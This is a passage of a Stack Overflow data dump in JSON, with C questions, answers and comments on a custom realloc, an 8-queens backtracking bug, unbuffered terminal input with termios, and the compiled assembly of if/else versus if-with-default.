I try to modify <code>cmd</code> I get invalid read. How can I solve this? I tried reallocating using the below function, as I'm not allowed to use <code>realloc</code>.</p>\n\n<pre><code>void    *ft_realloc(void *ptr, size_t len)\n{\n    void    *real;\n\n    real = (void *)malloc(len);\n    if (real)\n    {\n        memset(real, 0, len);\n        memcpy(real, ptr, strlen(ptr));\n    }\n    free(ptr);\n    return (real);\n}\n</code></pre>\n"}, {"tags": ["c", "backtracking"], "answers": [{"comments": [{"owner": {"reputation": 39, "user_id": 5383196, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-IMw9UcH5oNk/AAAAAAAAAAI/AAAAAAAACNY/5F_lcemJctQ/photo.jpg?sz=128", "display_name": "praveen londhe", "link": "https://stackoverflow.com/users/5383196/praveen-londhe"}, "edited": false, "score": 0, "creation_date": 1482918248, "post_id": 41359239, "comment_id": 69920052, "body": "Thank you very much.. :)... Could you please explain the question I asked at the end?"}, {"owner": {"reputation": 32386, "user_id": 4706785, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fdee2789e9bac57bfdd97abc4e533a4d?s=128&d=identicon&r=PG&f=1", "display_name": "Peter", "link": "https://stackoverflow.com/users/4706785/peter"}, "edited": false, "score": 2, "creation_date": 1482918258, "post_id": 41359239, "comment_id": 69920060, "body": "The comment about <code>main()</code> having to explicitly return is no longer true since the 1999 standard."}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 2, "creation_date": 1482918931, "post_id": 41359239, "comment_id": 69920393, "body": "You should write that it&#39;s a C89 problem. And the only way to write main is <code>int main(void)</code> and <code>int main(int argc, char **argv)</code>. The return value 0 is implicit since C99. Well I get no warning in C89 too."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "reply_to_user": {"reputation": 39, "user_id": 5383196, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-IMw9UcH5oNk/AAAAAAAAAAI/AAAAAAAACNY/5F_lcemJctQ/photo.jpg?sz=128", "display_name": "praveen londhe", "link": "https://stackoverflow.com/users/5383196/praveen-londhe"}, "edited": false, "score": 0, "creation_date": 1482920111, "post_id": 41359239, "comment_id": 69920980, "body": "@praveenlondhe: not sure, but that `    if (queen(a + 2, b + 1, c + 1))         return 1;     if (queen(a - 2, b + 1, c + 1))         return 1;` seems to miss the +1 and -1 values. BTW you could have used a loop instead of copy/paste."}, {"owner": {"reputation": 39, "user_id": 5383196, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-IMw9UcH5oNk/AAAAAAAAAAI/AAAAAAAACNY/5F_lcemJctQ/photo.jpg?sz=128", "display_name": "praveen londhe", "link": "https://stackoverflow.com/users/5383196/praveen-londhe"}, "edited": false, "score": 1, "creation_date": 1482920813, "post_id": 41359239, "comment_id": 69921418, "body": "@Jean-Fran&#231;oisFabre No... that was deliberate... since +1 and -1 squares are always attacked by the previously  placed queen. and thanks for the loping advice :)"}], "tags": [], "owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "is_accepted": false, "score": 1, "last_activity_date": 1548834033, "last_edit_date": 1548834033, "creation_date": 1482917929, "answer_id": 41359239, "question_id": 41359181, "link": "https://stackoverflow.com/questions/41359181/why-is-following-code-throwing-runtime-error-even-when-it-shows-desired-output/41359239#41359239", "title": "Why is following code throwing runtime error, even when it shows desired output?", "body": "<p>just look at your main routine:</p>\n\n<pre><code>int main()\n{\n    ...\n    if((i+1)%8==0)\n    printf(\"\\n\");\n}\n</code></pre>\n\n<p>it is supposed to return 0 on successful completion, but you don't return anything: so even if your program does what you want, since your return code is undefined.</p>\n\n<p>Not likely to be 0 in that case => seen as wrong execution by the engine executing it, which doesn't even try to go further into analysing program output.</p>\n\n<p>Fix (even if C99 makes it default, compiling with old C89 could yield undefined results):</p>\n\n<pre><code>    if((i+1)%8==0)\n    printf(\"\\n\");\n    return 0;\n}\n</code></pre>\n\n<p>As several people commented, the <code>return 0</code> statement is not mandatory in C99. But I suppose that your on-line platform enforces strict C89 rules so you have to add it.</p>\n"}, {"tags": [], "owner": {"reputation": 13767, "user_id": 2413201, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rxfuw.jpg?s=128&g=1", "display_name": "Armali", "link": "https://stackoverflow.com/users/2413201/armali"}, "is_accepted": false, "score": 1, "last_activity_date": 1548832809, "creation_date": 1548832809, "answer_id": 54435203, "question_id": 41359181, "link": "https://stackoverflow.com/questions/41359181/why-is-following-code-throwing-runtime-error-even-when-it-shows-desired-output/54435203#54435203", "title": "Why is following code throwing runtime error, even when it shows desired output?", "body": "<blockquote>\n  <p>Moreover, if I change the driver statement to \"<code>queen(0,0,0) or queen(1,0,0)</code>\", The result is well correct upto 4-5 columns, but is full of 0s in the remaining ones.</p>\n</blockquote>\n\n<p>There's a small, but impactful oversight: The array <code>demi</code> to store the board state of a previous instance in the recursion chain of <code>queen()</code> is defined globally; hence, recursive calls of <code>queen()</code> overwrite the saved state of former invocations, foiling the backtracking. Your program works if <code>demi</code> is defined locally in <code>queen()</code>.</p>\n\n<hr>\n\n<p>Regarding the program's exit status, the value of <code>b</code> at the end of <code>main()</code> lends itself to be used in <code>return !b;</code>, since the value 1 returned from <code>queen()</code> denotes success.</p>\n"}], "owner": {"reputation": 39, "user_id": 5383196, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-IMw9UcH5oNk/AAAAAAAAAAI/AAAAAAAACNY/5F_lcemJctQ/photo.jpg?sz=128", "display_name": "praveen londhe", "link": "https://stackoverflow.com/users/5383196/praveen-londhe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 49, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1548834033, "creation_date": 1482917710, "last_edit_date": 1482918421, "question_id": 41359181, "link": "https://stackoverflow.com/questions/41359181/why-is-following-code-throwing-runtime-error-even-when-it-shows-desired-output", "title": "Why is following code throwing runtime error, even when it shows desired output?", "body": "<p>I am solving the 8 queen problem using backtracking. When I compiled the following code in codechef IDE, it showed correct output, but still it shows runtime error.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\nint board[8][8] = { { 0 } };\nint demi[8][8] = { { 0 } };\nint queen(int a, int b, int c);\nvoid mark(int a, int b);\nint main()\n{\n    int i;\n    int b = queen(3, 0, 0);\n    for (i = 0; i &lt; 64; i++)\n    {\n        int x = board[i / 8][i % 8];\n        if (x == 1)\n            printf(\" %d \", x);\n        else\n        {\n            printf(\" 0 \");\n        }\n        if ((i + 1) % 8 == 0)\n            printf(\"\\n\");\n    }\n}\nint queen(int a, int b, int c)\n{\n    int t;\n    if (c == 8)\n        return 1;\n    if (a &lt; 0 || a &gt; 7 || b &lt; 0 || b &gt; 7)\n        return 0;\n    if (!(board[a][b] == 0))\n        return 0;\n    for (t = 0; t &lt; 64; t++)\n    {\n        demi[t / 8][t % 8] = board[t / 8][t % 8];\n    }\n    mark(a, b);\n    board[a][b] = 1;\n    /*  for(t = 2; t&lt;8; t++)\n     {\n     if(queen(a+(9-t), b+1, c+1))\n     return 1;\n     if(queen(a-t, b+1, c+1))\n     return 1;\n     }*/\n    if (queen(a + 7, b + 1, c + 1))\n        return 1;\n    if (queen(a + 6, b + 1, c + 1))\n        return 1;\n    if (queen(a + 5, b + 1, c + 1))\n        return 1;\n    if (queen(a + 4, b + 1, c + 1))\n        return 1;\n    if (queen(a + 3, b + 1, c + 1))\n        return 1;\n    if (queen(a + 2, b + 1, c + 1))\n        return 1;\n    if (queen(a - 2, b + 1, c + 1))\n        return 1;\n    if (queen(a - 3, b + 1, c + 1))\n        return 1;\n    if (queen(a - 4, b + 1, c + 1))\n        return 1;\n    if (queen(a - 5, b + 1, c + 1))\n        return 1;\n    if (queen(a - 6, b + 1, c + 1))\n        return 1;\n    if (queen(a - 7, b + 1, c + 1))\n        return 1;\n    board[a][b] = 0;\n    for (t = 0; t &lt; 64; t++) {\n        board[t / 8][t % 8] = demi[t / 8][t % 8];\n    }\n    return 0;\n}\nvoid mark(int a, int b)\n{\n    int i;\n    for (i = 0; i &lt; 64; i++)\n    {\n        int row = i / 8;\n        int col = i % 8;\n        if (row == a || col == b &amp;&amp; !(row == a &amp;&amp; col == b))\n            board[row][col] = 2;\n        if (abs(row - a) == abs(col - b))\n            board[row][col] = 2;\n    }\n}\n</code></pre>\n\n<p>Output :</p>\n\n<p><a href=\"https://i.stack.imgur.com/lx7WK.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/lx7WK.png\" alt=\"enter image description here\"></a></p>\n\n<p><strong>Moreover, if I change the driver statement to \"<code>queen(0,0,0) or queen(1,0,0)</code>\", The result is well correct upto 4-5 columns, but is full of 0s in the remaining ones.</strong></p>\n\n<p><a href=\"https://i.stack.imgur.com/RtQgW.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/RtQgW.png\" alt=\"enter image description here\"></a></p>\n\n<p>Where am I going wrong?</p>\n"}, {"tags": ["c", "scanf"], "comments": [{"owner": {"reputation": 1073, "user_id": 4911868, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/NNOca.jpg?s=128&g=1", "display_name": "Rakesh Nair", "link": "https://stackoverflow.com/users/4911868/rakesh-nair"}, "edited": false, "score": 1, "creation_date": 1482918028, "post_id": 41359168, "comment_id": 69919927, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/34570630/scanning-multiple-numbers-without-scanning-enter-in-c\">Scanning multiple numbers without scanning enter in C</a>"}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 1, "creation_date": 1482918357, "post_id": 41359168, "comment_id": 69920108, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/8101079/making-stdin-non-blocking\">Making stdin non-blocking</a>"}, {"owner": {"reputation": 2142, "user_id": 3173328, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/953cb4f902bbc7cc73a5156e7261ac6d?s=128&d=identicon&r=PG&f=1", "display_name": "Kabir Hossain", "link": "https://stackoverflow.com/users/3173328/kabir-hossain"}, "edited": false, "score": 0, "creation_date": 1482918488, "post_id": 41359168, "comment_id": 69920172, "body": "It is possible, If you use array for storing your input numbers after then retrieve the number from this array one by one. But it will take single digit.  It is very tough to understand your situation, So highlight your question with example."}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1482926688, "post_id": 41359168, "comment_id": 69924607, "body": "So when should your program start taking input? When the user has typed the last digit of the last number? How should your program know which digit is the last one? What if the user has spotted a mistake in the last digit and wants to correct it?"}], "answers": [{"comments": [{"owner": {"reputation": 4794, "user_id": 2038383, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/aN49R.png?s=128&g=1", "display_name": "semisecure", "link": "https://stackoverflow.com/users/2038383/semisecure"}, "reply_to_user": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1482919694, "post_id": 41359562, "comment_id": 69920764, "body": "@Stargateur it&#39;s a cut back example. In many scenarios you would want to reuse that, so the example shows common practice for doing so."}, {"owner": {"reputation": 4794, "user_id": 2038383, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/aN49R.png?s=128&g=1", "display_name": "semisecure", "link": "https://stackoverflow.com/users/2038383/semisecure"}, "reply_to_user": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 1, "creation_date": 1482920117, "post_id": 41359562, "comment_id": 69920986, "body": "@Stargateur, I&#39;m not going to add error checking. If I add it to scanf() what about all the other system calls. If I were to do &quot;full&quot; error checking I&#39;d include error checking macros which would confound the essence of the answer further."}, {"owner": {"reputation": 4794, "user_id": 2038383, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/aN49R.png?s=128&g=1", "display_name": "semisecure", "link": "https://stackoverflow.com/users/2038383/semisecure"}, "reply_to_user": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 2, "creation_date": 1482920373, "post_id": 41359562, "comment_id": 69921155, "body": "@Stargateur Down voting because no error checking? Jeez."}, {"owner": {"reputation": 4794, "user_id": 2038383, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/aN49R.png?s=128&g=1", "display_name": "semisecure", "link": "https://stackoverflow.com/users/2038383/semisecure"}, "reply_to_user": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 1, "creation_date": 1482921688, "post_id": 41359562, "comment_id": 69921916, "body": "@Stargateur It doesn&#39;t return every second. <b>scanf() blocks</b>. But your right in that to wake every second is redundant in this case. Removed that line."}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1482925657, "post_id": 41359562, "comment_id": 69923998, "body": "Well, just <code>if (scanf(...) == 4) printf(...)</code> would be enough... It was just to show that scanf <b>need</b> to be check. Input need to be check it&#39;s very important to understand for beginner."}], "tags": [], "owner": {"reputation": 4794, "user_id": 2038383, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/aN49R.png?s=128&g=1", "display_name": "semisecure", "link": "https://stackoverflow.com/users/2038383/semisecure"}, "is_accepted": false, "score": 3, "last_activity_date": 1482926321, "last_edit_date": 1482926321, "creation_date": 1482919095, "answer_id": 41359562, "question_id": 41359168, "link": "https://stackoverflow.com/questions/41359168/in-c-language-how-can-i-make-a-scanf-function-that-doesnt-need-to-require-the-u/41359562#41359562", "title": "In c language, how can i make a scanf function that doesnt need to require the user to press Enter?", "body": "<p>In UNIX, to control when data is returned from a terminal device you use <a href=\"https://linux.die.net/man/3/tcsetattr\" rel=\"nofollow noreferrer\">tcsetattr()/tcgetattr() functions</a> to change the characteristics of the terminal device. Apparently these functions are POSIX.2001 too.</p>\n\n<p>Here is a simple C program that will do what you want, by setting the terminal device to return characters to the reader one character at a time (see inline comments, <em>robust error checking not included</em>):</p>\n\n\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;termios.h&gt;\n\nint main(int argc, char * argv[]) {\n  int i[4] = {0};\n  struct termios oldtermios, newtermios;\n  tcgetattr(STDIN_FILENO, &amp;oldtermios);\n  newtermios = oldtermios;\n  newtermios.c_lflag &amp;= ~ICANON; // Turn off canonical mode.\n  // Wait for 1 character only.\n  newtermios.c_cc[VMIN] = 1;\n  tcsetattr(STDIN_FILENO, TCSANOW,  &amp;newtermios);\n  do {\n    printf(\"Enter four numbers:\\n\");\n    int ns = scanf(\" %d %d %d %d\", &amp;i[0], &amp;i[1], &amp;i[2], &amp;i[3]);\n    if(ns == EOF) {\n      perror(\"Scan failed. Exiting\");\n      break;\n    }\n    else if(ns != 4) {\n      printf(\"\\nScan failed. Only read %d numbers. Press enter to continue.\\n\", ns);\n      while((i[0] = getchar()) != '\\n' &amp;&amp; i[0] != EOF);\n    }\n    else {\n      printf(\"\\nScanned %d numbers %d %d %d %d\\n\", ns, i[0], i[1], i[2], i[3]);\n    }\n  } while(1);\n  return 1;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 111, "user_id": 3219109, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aa01e64b01aa9551c2f5d5f4bc742832?s=128&d=identicon&r=PG&f=1", "display_name": "Edward", "link": "https://stackoverflow.com/users/3219109/edward"}, "is_accepted": false, "score": 0, "last_activity_date": 1482922515, "creation_date": 1482922515, "answer_id": 41360517, "question_id": 41359168, "link": "https://stackoverflow.com/questions/41359168/in-c-language-how-can-i-make-a-scanf-function-that-doesnt-need-to-require-the-u/41360517#41360517", "title": "In c language, how can i make a scanf function that doesnt need to require the user to press Enter?", "body": "<p>You can use <code>getch()</code> function. It getting one character and not required press <code>Enter</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 307, "user_id": 4920739, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0771c643189144477a376f168c3adda8?s=128&d=identicon&r=PG&f=1", "display_name": "vguberinic", "link": "https://stackoverflow.com/users/4920739/vguberinic"}, "is_accepted": false, "score": 0, "last_activity_date": 1482930575, "creation_date": 1482930575, "answer_id": 41362811, "question_id": 41359168, "link": "https://stackoverflow.com/questions/41359168/in-c-language-how-can-i-make-a-scanf-function-that-doesnt-need-to-require-the-u/41362811#41362811", "title": "In c language, how can i make a scanf function that doesnt need to require the user to press Enter?", "body": "<p>The issue here is not with scanf or even with C standard. Your terminal is not sending data to your input buffer before you press enter.</p>\n\n<p>Solutions will vary based on platform you are using. My favorite solution in this case is to use curses library. It exists on all posix platforms and is ported to windows as pdcurses (and maybe others).</p>\n\n<p>Sample code and a really good tutorial can be found here: <a href=\"http://tldp.org/HOWTO/NCURSES-Programming-HOWTO/init.html#ABOUTINIT\" rel=\"nofollow noreferrer\">http://tldp.org/HOWTO/NCURSES-Programming-HOWTO/init.html#ABOUTINIT</a></p>\n"}], "owner": {"reputation": 41, "user_id": 7349097, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9ddca0d2a2eabfe9848025c2ca1c8c90?s=128&d=identicon&r=PG&f=1", "display_name": "\u05d3\u05e0\u05d9\u05d0\u05dc \u05d1\u05df-\u05e9\u05d1\u05ea", "link": "https://stackoverflow.com/users/7349097/%d7%93%d7%a0%d7%99%d7%90%d7%9c-%d7%91%d7%9f-%d7%a9%d7%91%d7%aa"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 209, "favorite_count": 1, "answer_count": 3, "score": 3, "last_activity_date": 1482930575, "creation_date": 1482917670, "last_edit_date": 1482922461, "question_id": 41359168, "link": "https://stackoverflow.com/questions/41359168/in-c-language-how-can-i-make-a-scanf-function-that-doesnt-need-to-require-the-u", "title": "In c language, how can i make a scanf function that doesnt need to require the user to press Enter?", "body": "<p>I'm trying to make a program that asks the user to write 4 numbers, and after these 4 numbers, the program will take those numbers without having the user to press Enter.\nI have tried to use the scanf() function, but scanf() requires the user to press Enter.\nDoes someone know how can I do this?</p>\n"}, {"tags": ["c++", "c", "assembly", "optimization"], "comments": [{"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1482917360, "post_id": 41359023, "comment_id": 69919540, "body": "I predict a lot of upvotes on that question :)"}, {"owner": {"reputation": 36141, "user_id": 4354477, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/SuxtS.gif?s=128&g=1", "display_name": "ForceBru", "link": "https://stackoverflow.com/users/4354477/forcebru"}, "edited": false, "score": 2, "creation_date": 1482917611, "post_id": 41359023, "comment_id": 69919681, "body": "If you wonder whether X is faster than Y, you should profile, <i>profile</i> and <b>profile</b>. Only accurate timings will shed some light on the problem."}, {"owner": {"reputation": 209335, "user_id": 661519, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1735ab1c8ba4229daa855ec6aad03065?s=128&d=identicon&r=PG", "display_name": "juanchopanza", "link": "https://stackoverflow.com/users/661519/juanchopanza"}, "edited": false, "score": 0, "creation_date": 1482917644, "post_id": 41359023, "comment_id": 69919710, "body": "Are you asking if one is faster than the other (the profile) or why the assembly is different?"}, {"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 4, "creation_date": 1482917666, "post_id": 41359023, "comment_id": 69919723, "body": "The reason may be because the two pointers may point to the same object. If it&#39;s a memory-mapped output register for instance, the two pieces of code will have drastically different outcomes."}, {"owner": {"reputation": 3110, "user_id": 5470144, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/VVhju.jpg?s=128&g=1", "display_name": "Elad Weiss", "link": "https://stackoverflow.com/users/5470144/elad-weiss"}, "reply_to_user": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 0, "creation_date": 1482918287, "post_id": 41359023, "comment_id": 69920073, "body": "@StoryTeller sorry I don&#39;t get it :("}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "reply_to_user": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 1, "creation_date": 1482918588, "post_id": 41359023, "comment_id": 69920228, "body": "@StoryTeller: they&#39;re not <code>volatile</code>, so the compiler is allowed to assume that it doesn&#39;t have to do the <code>*x = 0</code> store if <code>c==99</code>.  The code difference is due to the compiler implementing the code literally, for lack of any other hints.  With profile-guided optimization, it would know how likely the if() condition was to be taken/not-taken and lay out the code accordingly so the most common case was the fast path.  (<a href=\"http://stackoverflow.com/questions/24301397/likelyx-and-builtin-expectx-1\">Or with <code>likely</code>/<code>unlikely</code> macros using GNU C <code>__builtin_expect()</code></a>)"}, {"owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "reply_to_user": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1482918964, "post_id": 41359023, "comment_id": 69920411, "body": "@PeterCordes - And yet the chance at aliasing still makes optimization logic a sticky matter. In <code>C</code> I presume the above would yield the exact same code if the two pointers were marked with <code>restrict</code>"}, {"owner": {"reputation": 3392, "user_id": 7175117, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Tfz44.png?s=128&g=1", "display_name": "freestyle", "link": "https://stackoverflow.com/users/7175117/freestyle"}, "edited": false, "score": 0, "creation_date": 1482919981, "post_id": 41359023, "comment_id": 69920917, "body": "At any rate, if default isn&#39;t hard I think default+if more better then if/else."}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "reply_to_user": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "edited": false, "score": 1, "creation_date": 1482921266, "post_id": 41359023, "comment_id": 69921672, "body": "@StoryTeller: yes, potential aliasing means the compiler needs to do that last set of stores in program order.  But both branches store through both pointers, so it doesn&#39;t really reduce the optimization possibilities.  If there were two levels of indirection, where the first store could change the destination of the second store, that would be another matter.  But since <code>*x</code> can&#39;t alias <code>y</code>, only <code>*y</code>, I agree that adding <code>restrict</code> probably won&#39;t matter, in practice or in theory."}, {"owner": {"reputation": 48421, "user_id": 1196549, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/fa597bf0dc47449a25e1f7f5b57e3ef1?s=128&d=identicon&r=PG", "display_name": "Yves Daoust", "link": "https://stackoverflow.com/users/1196549/yves-daoust"}, "edited": false, "score": 0, "creation_date": 1482935568, "post_id": 41359023, "comment_id": 69929535, "body": "The alignment of the branching addresses may make a difference in the execution time, so it is virtually impossible to draw a general conclusion."}, {"owner": {"reputation": 221394, "user_id": 366904, "user_type": "moderator", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/3f8912af19fe86b7b34a0b011a962460?s=128&d=identicon&r=PG", "display_name": "Cody Gray", "link": "https://stackoverflow.com/users/366904/cody-gray"}, "edited": false, "score": 0, "creation_date": 1482939859, "post_id": 41359023, "comment_id": 69931972, "body": "The optimizer will align the branch targets as necessary for performance (on x86, that is generally 16-byte alignment), so it&#39;s reasonable to assume that alignment is <i>not</i> an issue here."}], "answers": [{"comments": [{"owner": {"reputation": 3110, "user_id": 5470144, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/VVhju.jpg?s=128&g=1", "display_name": "Elad Weiss", "link": "https://stackoverflow.com/users/5470144/elad-weiss"}, "edited": false, "score": 0, "creation_date": 1482926662, "post_id": 41360607, "comment_id": 69924590, "body": "Wow. Thanks and thanks again for the Great links to Agner Fog."}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1482977267, "post_id": 41360607, "comment_id": 69946217, "body": "Nice answer that covers what compilers really do with code like this.  I think in the general case, I&#39;d recommend writing code that writes to a variable exactly once, rather than at least once and sometimes twice.  It seems compilers sometimes have trouble optimizing away the first store in cases where the second store happens.  It&#39;s also less likely to cause aliasing problems for the optimizer.  (Of course, hardware is usually very good at soaking this up in the store buffer and L1 cache throughput.  A second store to the same location is extremely cheap.)"}], "tags": [], "owner": {"reputation": 221394, "user_id": 366904, "user_type": "moderator", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/3f8912af19fe86b7b34a0b011a962460?s=128&d=identicon&r=PG", "display_name": "Cody Gray", "link": "https://stackoverflow.com/users/366904/cody-gray"}, "is_accepted": true, "score": 14, "last_activity_date": 1482948844, "last_edit_date": 1495535453, "creation_date": 1482922778, "answer_id": 41360607, "question_id": 41359023, "link": "https://stackoverflow.com/questions/41359023/is-if-else-faster-than-if-default/41360607#41360607", "title": "Is if else faster than if + default?", "body": "\n\n<blockquote>\n  <p>For the functions above, I got the exact same assembly code (using cmovne).</p>\n</blockquote>\n\n<p>Sure, some compilers may make that optimization, but it is not guaranteed. It is very possible that you will get different object code for those two ways of writing the function.</p>\n\n<p>In fact, <em>no</em> optimization is guaranteed (although modern optimizing compilers do an impressive job most of the time), so you should either write the code to capture the semantic meaning you intend for it to have, <em>or</em> you should verify the generated object code and write the code to ensure that you are getting the expected output.</p>\n\n<p>Here is what older versions of MSVC will generate when targeting x86-32 (primarily <a href=\"https://stackoverflow.com/questions/13661285/generating-cmov-instructions-using-microsoft-compilers/41144749#41144749\">because they don't know to use the CMOV instruction</a>):</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>test0 PROC\n    cmp      BYTE PTR [c], 99\n    mov      eax, DWORD PTR [x]\n    mov      DWORD PTR [eax], 0\n    jne      SHORT LN2\n    mov      DWORD PTR [eax], 15\nLN2:\n    ret      0\ntest0 ENDP\n</code></pre>\n\n\n\n<pre class=\"lang-none prettyprint-override\"><code>test1 PROC\n    mov      eax, DWORD PTR [x]\n    xor      ecx, ecx\n    cmp      BYTE PTR 